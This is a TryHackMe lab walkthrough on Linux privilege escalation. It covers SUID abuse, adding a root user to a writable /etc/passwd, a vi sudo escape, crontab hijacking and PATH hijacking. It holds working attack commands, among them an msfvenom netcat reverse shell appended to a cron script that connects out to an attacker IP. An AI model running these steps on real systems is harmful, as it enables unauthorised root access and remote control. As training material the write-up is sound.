# Common Linux Privesc

**Room Link:** [https://tryhackme.com/room/commonlinuxprivesc](https://tryhackme.com/room/commonlinuxprivesc)



## Enumeration



Download LinEnum Script

**Kali**

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Login to host

**Kali**

```
ssh user3@$VICTIM
Password: password
```

The target's hostname

<figure><img src="../../.gitbook/assets/image (1) (11).png" alt=""><figcaption></figcaption></figure>

There are 8 users

<figure><img src="../../.gitbook/assets/image (2) (3) (2).png" alt=""><figcaption></figcaption></figure>

4 shells

<figure><img src="../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (3) (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

Some users can write to passwd file

<figure><img src="../../.gitbook/assets/image (4) (9).png" alt=""><figcaption></figcaption></figure>

## Abusing SUID/GUID Files

**Victim**

```
find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

Running the shell script in user3 home directory gives us root access right away.

**Victim**

```
/home/user3/shell
```

<figure><img src="../../.gitbook/assets/image (4) (3) (1).png" alt=""><figcaption></figcaption></figure>

## Exploiting Writeable /etc/passwd

**Victim**

```
su user7
Password: password
```

**Victim**

```
openssl passwd -1 -salt new 123
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (6) (3) (3).png" alt=""><figcaption></figcaption></figure>

```
su new
Password: 123
```

<figure><img src="../../.gitbook/assets/image (1) (7).png" alt=""><figcaption></figcaption></figure>

## Escaping Vi Editor

**Victim**

```
su user8
Password: password
```

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (3) (1) (6).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo vi
:!sh
whoami
```

<figure><img src="../../.gitbook/assets/image (5) (3) (2).png" alt=""><figcaption></figcaption></figure>

## Exploiting Crontab

**Victim**

```
ssh user4@$VICTIM
Password: password
```

**Kali**

```
msfvenom -p cmd/unix/reverse_netcat lhost=$KALI lport=8888 R
```

<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 8888
```

**Victim**

```
cat /etc/crontab 
```

<figure><img src="../../.gitbook/assets/image (11) (1) (4).png" alt=""><figcaption></figcaption></figure>

Add our payload we made in Kali to the script

**Victim**

```
echo 'mkfifo /tmp/cibykaz; nc 10.10.185.2 8888 0</tmp/cibykaz | /bin/sh >/tmp/cibykaz 2>&1; rm /tmp/cibykaz' >> /home/user4/Desktop/autoscript.sh
```

Wait for the script to run and catch the shell on Kali.

<figure><img src="../../.gitbook/assets/image (3) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

## Exploiting PATH Variable

**Victim**

```
su user5
Password: password
```

The script in user5 home directory is just doing the command ls.

**Victim**

```
cd /home/user5
./script
```

<figure><img src="../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

We now create a script called ls that gives us a bash shell.

**Victim**

```
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
```

Before we change the path we can see ls goes to /bin/ls

****![](<../../.gitbook/assets/image (8) (7).png>)****

Now after running the below command ls is now directed to our script.

**Victim**

```
export PATH=/tmp:$PATH
```

<figure><img src="../../.gitbook/assets/image (14) (3) (1).png" alt=""><figcaption></figcaption></figure>

Now the script in user5s directory acts differently, we now have a root shell.

**Victim**

```
cd /home/user5
/script 
```

<figure><img src="../../.gitbook/assets/image (18) (3).png" alt=""><figcaption></figcaption></figure>

Run the following to reset the path variable.

**Victim**

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
```
